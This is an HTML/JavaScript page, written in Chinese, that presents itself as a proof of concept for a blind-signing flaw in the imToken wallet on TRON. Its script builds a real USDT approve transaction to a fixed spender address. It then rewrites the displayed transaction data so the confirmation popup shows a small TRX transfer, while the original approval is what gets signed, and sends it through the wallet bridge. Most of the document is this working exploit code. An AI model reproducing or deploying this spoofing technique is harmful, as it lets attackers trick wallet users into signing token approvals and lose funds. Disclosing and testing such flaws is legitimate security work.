<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>所见非所签漏洞验证 (imToken TRON)</title>
  <style>
    :root {
      --bg: #0b0f14; --card: #131a22; --border: #253040;
      --text: #e1e6ed; --text2: #8899aa; --red: #f04343;
      --orange: #e6a23c; --green: #2ecc71; --blue: #4d94ff;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: var(--bg); color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      padding: 16px; display: flex; flex-direction: column; gap: 14px;
    }
    .card {
      background: var(--card); border: 1px solid var(--border);
      border-radius: 14px; padding: 18px;
    }
    .card-header {
      font-weight: 600; font-size: 15px; margin-bottom: 12px;
      display: flex; align-items: center; gap: 8px;
    }
    .dot { width:9px; height:9px; border-radius:50%; display:inline-block; }
    .dot.red{background:var(--red)} .dot.green{background:var(--green)} .dot.orange{background:var(--orange)}
    .row {
      display: flex; justify-content: space-between; align-items: flex-start;
      padding: 6px 0; font-size: 13px; border-bottom: 1px solid rgba(255,255,255,0.05);
    }
    .label { color: var(--text2); min-width: 85px; }
    .value { text-align: right; word-break: break-all; font-family: monospace; font-size: 12px; }
    .highlight-red { color: var(--red); font-weight: 600; }
    .highlight-green { color: var(--green); }
    .btn {
      width: 100%; padding: 14px 0; border-radius: 10px; border: none;
      font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px;
    }
    .btn-connect { background: var(--green); color: #000; }
    .btn-test { background: #e64343; color: #fff; }
    .btn-check { background: var(--blue); color: #fff; }
    .log-box {
      background: #090d13; border: 1px solid var(--border); border-radius: 10px;
      padding: 10px; font-family: monospace; font-size: 11px; max-height: 220px;
      overflow-y: auto; color: #aab5c0; margin-top: 8px;
    }
    .log-line { padding: 2px 0; }
    .log-error { color: var(--red); }
    .log-success { color: var(--green); }
    .log-warn { color: var(--orange); }
  </style>
</head>
<body>

  <div class="card">
    <div class="card-header"><span class="dot red"></span> 漏洞验证流程</div>
    <div style="font-size:13px; color:var(--text2);">
      1. 连接钱包 → 2. 发送验证交易 → 3. 观察 imToken 弹窗<br>
      <span class="highlight-green">弹窗将显示：发送 0.1 TRX 至 TEfFnh...bSAz</span><br>
      <span class="highlight-red">实际签名内容：USDT approve (授权 1 USDT)</span>
    </div>
  </div>

  <div class="card" id="statusCard">
    <div class="card-header"><span class="dot orange" id="dotStatus"></span> 钱包状态</div>
    <div id="beforeConnect">
      <div class="row"><span class="label">状态</span><span class="value">未连接</span></div>
      <button class="btn btn-connect" id="btnConnect">连接 imToken 钱包</button>
    </div>
    <div id="afterConnect" style="display:none;">
      <div class="row"><span class="label">地址</span><span class="value" id="addrText"></span></div>
      <div class="row"><span class="label">TRX</span><span class="value" id="trxBal"></span></div>
      <button class="btn btn-test" id="btnSend">发送验证交易 (伪装转账)</button>
      <button class="btn btn-check" id="btnCheckAllowance">查询 USDT 授权额度</button>
    </div>
  </div>

  <div class="card" id="allowanceCard" style="display:none;">
    <div class="card-header"><span class="dot orange"></span> USDT 授权额度</div>
    <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
    <div class="row"><span class="label">变化</span><span class="value" id="allowanceChange">--</span></div>
    <div class="info-box" style="background:rgba(77,148,255,0.08);border:1px solid rgba(77,148,255,0.2);border-radius:8px;padding:10px;font-size:12px;color:var(--blue);margin-top:10px;">
      若授权从 0 变为 1 USDT，则证明确认页显示为 TRX 转账，但链上执行了 USDT 授权。
    </div>
  </div>

  <div class="card">
    <div class="card-header"><span class="dot orange"></span> 运行日志</div>
    <div class="log-box" id="logContainer">等待操作…</div>
  </div>

<script>
(function() {
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  const SPENDER = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
  const APPROVE_AMOUNT = '1000000'; // 1 USDT (6 decimals)
  const TRON_API = 'https://api.trongrid.io';

  let walletAddr = '';
  let initialAllowance = null;
  let lastTxID = null;

  const $ = id => document.getElementById(id);
  function log(msg, type = '') {
    const div = document.createElement('div');
    div.className = 'log-line' + (type ? ' log-' + type : '');
    div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    $('logContainer').appendChild(div);
    $('logContainer').scrollTop = $('logContainer').scrollHeight;
  }

  function hasBridge() {
    return typeof window.imToken !== 'undefined' && typeof window.imToken.callPromisifyAPI === 'function';
  }

  // ---------- 钱包连接 ----------
  async function connect() {
    log('检查钱包环境…', 'warn');
    if (!hasBridge()) {
      log('未检测到 imToken 桥接，请在 imToken DApp 中打开', 'error');
      alert('请在 imToken DApp 浏览器中打开本页面，并切换至 TRON 网络');
      return;
    }
    // 等待 tronWeb 就绪
    if (!window.tronWeb || !window.tronWeb.ready) {
      await new Promise(r => setTimeout(r, 600));
    }
    if (window.tronWeb && window.tronWeb.ready) {
      walletAddr = window.tronWeb.defaultAddress.base58;
    } else {
      try {
        const accounts = await window.imToken.callPromisifyAPI('tron_requestAccounts');
        if (Array.isArray(accounts) && accounts.length) walletAddr = accounts[0];
        else walletAddr = accounts;
      } catch (e) {
        log('连接失败: ' + e.message, 'error');
        return;
      }
    }
    if (!walletAddr || walletAddr.length !== 34) {
      log('获取地址失败', 'error');
      return;
    }
    $('addrText').textContent = walletAddr;
    try {
      const resp = await fetch(TRON_API + '/v1/accounts/' + walletAddr);
      const data = await resp.json();
      const bal = (data.data?.[0]?.balance || 0) / 1e6;
      $('trxBal').textContent = bal + ' TRX';
    } catch { $('trxBal').textContent = '--'; }
    $('dotStatus').className = 'dot green';
    $('beforeConnect').style.display = 'none';
    $('afterConnect').style.display = 'block';
    log('已连接: ' + walletAddr, 'success');
    await refreshAllowanceUI(true);
  }

  // ---------- Allowance 查询 ----------
  async function queryAllowance(owner, spender) {
    try {
      const ownerHex = window.tronWeb.address.toHex(owner);
      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
      const spenderHex = window.tronWeb.address.toHex(spender).replace(/^41/, '0x');
      const result = await window.tronWeb.transactionBuilder.triggerConstantContract(
        contractHex,
        'allowance(address,address)',
        {},
        [{ type: 'address', value: owner }, { type: 'address', value: spender }],
        ownerHex
      );
      if (result && result.constant_result && result.constant_result[0]) {
        return BigInt('0x' + result.constant_result[0]);
      }
      return null;
    } catch (e) {
      log('查询 allowance 失败: ' + e.message, 'error');
      return null;
    }
  }

  function formatAmount(wei) {
    if (wei === null || wei === undefined) return '--';
    try {
      const num = Number(wei) / 1e6;
      return num.toLocaleString(undefined, { maximumFractionDigits: 2 }) + ' USDT';
    } catch { return wei.toString(); }
  }

  async function refreshAllowanceUI(initial = false) {
    if (!walletAddr) return;
    const allowance = await queryAllowance(walletAddr, SPENDER);
    if (allowance === null) {
      $('currentAllowance').textContent = '查询失败';
      $('allowanceChange').textContent = '--';
      return;
    }
    $('currentAllowance').textContent = formatAmount(allowance);
    $('allowanceCard').style.display = 'block';
    if (initial) {
      initialAllowance = allowance;
      $('allowanceChange').textContent = '初始值';
    } else if (initialAllowance !== null) {
      const diff = allowance - initialAllowance;
      if (diff > 0n) {
        $('allowanceChange').textContent = '+' + formatAmount(diff);
        $('allowanceChange').style.color = 'var(--red)';
        log('⚠️ 授权额度增加！弹窗显示 TRX 转账，链上实际执行了 USDT 授权。', 'error');
      } else {
        $('allowanceChange').textContent = '无变化';
      }
    }
  }

  // ---------- 构造伪装交易（关键修复） ----------
  async function buildFakeTx() {
    // 1. 用 tronWeb 生成真正的 approve 交易
    const userHex = window.tronWeb.address.toHex(walletAddr);
    const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
    const spenderHex = window.tronWeb.address.toHex(SPENDER);
    
    log('构造真实 approve 交易...', 'warn');
    const { transaction, result } = await window.tronWeb.transactionBuilder.triggerSmartContract(
      contractHex,
      'approve(address,uint256)',
      { feeLimit: 15000000, callValue: 0 },
      [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
      userHex
    );
    
    if (!result || !result.result || !transaction) {
      log('生成 approve 交易失败', 'error');
      return null;
    }

    // 保存真实的 raw_data_hex
    const realRawDataHex = transaction.raw_data_hex;

    // 2. 修改 raw_data 为 TRX 转账的展示内容
    transaction.raw_data.contract[0].type = 'TransferContract';
    transaction.raw_data.contract[0].parameter = {
      type_url: 'type.googleapis.com/protocol.TransferContract',
      value: {
        amount: 100000,           // 0.1 TRX (单位 SUN)
        to_address: SPENDER,
        owner_address: walletAddr
      }
    };

    // 保留 txID（根据真实数据计算）
    if (transaction.txID) {
      // tronWeb 自动计算了 txID
    } else {
      // 若未带，可手动计算
      try {
        const txID = await window.tronWeb.sha3(realRawDataHex, { encoding: 'hex' });
        transaction.txID = txID.replace(/^0x/, '');
      } catch {}
    }

    return {
      tx: transaction,
      realHex: realRawDataHex
    };
  }

  // ---------- 发送交易 ----------
  async function sendTx() {
    log('📌 开始构造交易…', 'warn');
    if (!walletAddr) { alert('请先连接钱包'); return; }
    if (!hasBridge()) { log('imToken 桥接不可用', 'error'); return; }

    const result = await buildFakeTx();
    if (!result) return;

    log('伪装交易构建完成', 'success');
    log('raw_data.contract[0].type = ' + result.tx.raw_data.contract[0].type, 'success');
    log('真实 raw_data_hex 包含 approve: ' + result.realHex.includes('095ea7b3'), 'success');

    // 调用 imToken 原生发送接口
    log('准备调用 sendTransaction ...', 'warn');
    log('弹窗应显示：发送 0.1 TRX 至 ' + SPENDER, 'warn');

    try {
      const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
        tx: result.tx,
        from: walletAddr,
        useTronHeader: true
      });
      log('返回: ' + JSON.stringify(res), 'success');
      if (res && (res.txid || res.result || res.txID)) {
        lastTxID = res.txid || res.result || res.txID;
        log('交易已广播! TXID: ' + lastTxID, 'success');
        log('Tronscan: https://tronscan.org/#/transaction/' + lastTxID, 'info');
        setTimeout(() => refreshAllowanceUI(false), 12000);
      } else {
        log('未返回 txid，交易可能失败', 'error');
      }
    } catch (e) {
      log('sendTransaction 错误: ' + e.message, 'error');
      if (e.message.includes('reject')) log('用户取消', 'warn');
    }
  }

  async function manualCheck() {
    if (!walletAddr) return;
    log('手动查询 allowance…', 'warn');
    await refreshAllowanceUI(false);
  }

  $('btnConnect').addEventListener('click', connect);
  $('btnSend').addEventListener('click', sendTx);
  $('btnCheckAllowance').addEventListener('click', manualCheck);

  if (hasBridge()) log('imToken 桥接环境就绪', 'success');
  else log('请在 imToken DApp 中打开', 'warn');
})();
</script>
</body>
</html>
